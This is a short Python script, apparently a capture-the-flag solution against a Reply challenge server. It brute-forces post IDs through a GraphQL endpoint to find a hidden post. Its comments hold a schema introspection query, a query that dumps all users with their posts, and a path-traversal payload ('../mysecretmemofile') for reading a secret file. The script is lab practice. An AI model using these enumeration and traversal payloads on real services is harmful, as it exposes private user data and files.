import requests

for postnum in range(1,256):
    print(postnum)
    r = requests.post(
        'http://gamebox1.reply.it/a37881ac48f4f21d0fb67607d6066ef7/graphql',
        json = {'query':f'query{{post(id:{postnum}){{content}}}}'}
    )
    json = r.json()
    if 'uselesesstext' not in json["data"]["post"]["content"]:
        print('trovato!')
        print(postnum)
        print(r.text)
        print("fine")

# query availableQueries {
#   __schema {
#     queryType {
#       fields {
#         name
#         description
#       }
#     }
#   }
# }

# {
#   allUsers {
#     id,
#     username,
#     firstName,
#     lastName,
#     posts {
#       id,
#       title,
#       content,
#       public,
#       author {
#         id
#       }
#     }
#   }
# }

# {
#   post(id:40)
#   {
#     id,
#     title,
#     content,
#     public,
#     author {
#       id
#     }
#   }
# }

# {
#   getAsset(name:"../mysecretmemofile")
# }